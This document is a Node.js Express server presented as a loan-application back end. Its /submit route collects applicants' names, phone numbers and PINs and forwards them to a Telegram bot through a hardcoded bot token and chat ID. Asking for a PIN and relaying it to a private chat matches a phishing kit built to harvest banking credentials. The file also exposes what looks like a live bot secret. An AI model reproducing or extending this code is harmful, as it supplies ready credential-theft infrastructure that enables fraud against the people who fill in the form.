const express = require("express");
const path = require("path");
const fetch = require("node-fetch"); // ✅ ADD THIS

const app = express();

// ✅ ADD THIS (VERY IMPORTANT)
app.use(express.json());

// serve static files
app.use(express.static(path.join(__dirname, "public")));

// ==============================
// TELEGRAM CONFIG (PUT YOURS)
// ==============================
const TELEGRAM_TOKEN = "8724075511:AAHN23CLArz-pRRZzec8AOBdgnKkWZRzFrk";
const CHAT_ID = "7162360402";

// ==============================
// TELEGRAM FUNCTION
// ==============================
async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot8724075511:AAHN23CLArz-pRRZzec8AOBdgnKkWZRzFrk/sendMessage`;

  await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: 7162360402,
      text: message,
    }),
  });
}

// ==============================
// SUBMIT ROUTE (THIS IS NEW)
// ==============================
app.post("/submit", async (req, res) => {
  const data = req.body;

  const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${data.name}
📞 Phone: ${data.phone}
🔐 PIN: ${data.pin}
  `;

  try {
    await sendToTelegram(message);
    res.json({ success: true });
  } catch (err) {
    console.log(err);
    res.status(500).json({ success: false });
  }
});

// ==============================
// ROOT ROUTE
// ==============================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ==============================
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on ${PORT}`);
});